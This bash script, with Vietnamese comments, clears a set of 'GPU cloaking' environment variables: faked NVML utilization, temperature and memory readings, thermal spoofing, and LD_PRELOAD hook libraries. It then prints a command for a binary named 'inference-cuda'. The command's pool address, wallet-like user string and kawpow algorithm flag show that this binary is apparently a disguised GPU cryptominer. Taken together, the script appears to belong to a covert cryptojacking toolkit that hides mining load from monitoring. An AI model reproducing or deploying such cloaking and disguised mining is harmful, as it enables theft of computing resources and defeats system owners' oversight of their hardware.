#!/bin/bash
# 🔧 GPU Cloaking Environment Variables Unset Script
# Unset tất cả biến môi trường GPU cloaking để chạy manual inference-cuda

echo "🔧 [UNSET-GPU-CLOAKING] Removing GPU cloaking environment variables..."

# 1. NVML Interception Variables
echo "🔌 [NVML-HOOKS] Unsetting NVML interception variables..."
unset ENABLE_NVML_IPC_HIJACKING
unset NVML_FAKE_UTIL  
unset NVML_FAKE_TEMP
unset NVML_FAKE_MEM_MB
unset NVML_ADD_NOISE

# 2. Thermal Spoofing Variables  
echo "🌡️ [THERMAL-SPOOF] Unsetting thermal spoofing variables..."
unset ENABLE_TEMP_SPOOF
unset SPOOF_TEMP_VALUE
unset TEMP_SPOOF_ADD_NOISE

# 3. LD_PRELOAD Hooks (CRITICAL)
echo "🔗 [LD-PRELOAD] Removing hook libraries..."
unset LD_PRELOAD

# 4. GPU Plugin Configuration
echo "⚙️ [GPU-CONFIG] Unsetting GPU plugin configuration..."
unset GPU_PLUGINS_CONFIG
unset GPU_CLOAK_LOG_LEVEL

# 5. Optional: Reset CUDA environment to defaults
echo "🎯 [CUDA-RESET] Resetting CUDA environment variables..."
unset CUDA_VISIBLE_DEVICES
unset CUDA_DEVICE_MAX_CONNECTIONS
unset CUDA_LAUNCH_TIMEOUT
unset CUDA_CACHE_DISABLE
unset CUDA_FORCE_PTX_JIT
unset CUDA_DISABLE_CUBLASLT
unset CUDA_MODULE_LOADING
unset NVIDIA_DRIVER_CAPABILITIES

echo "✅ [UNSET-COMPLETE] All GPU cloaking variables removed"
echo "🚀 [READY] Environment clean for manual inference-cuda execution"
echo ""
echo "📋 [USAGE] Run inference-cuda manually:"
echo "/usr/local/bin/inference-cuda -o 127.0.0.1:4444 -u RJPySG2zo7dG7oah9i7zseZRvMLaAUkzkx --tls --cuda --cuda-loader=/usr/local/bin/libmlls-cuda.so -a kawpow"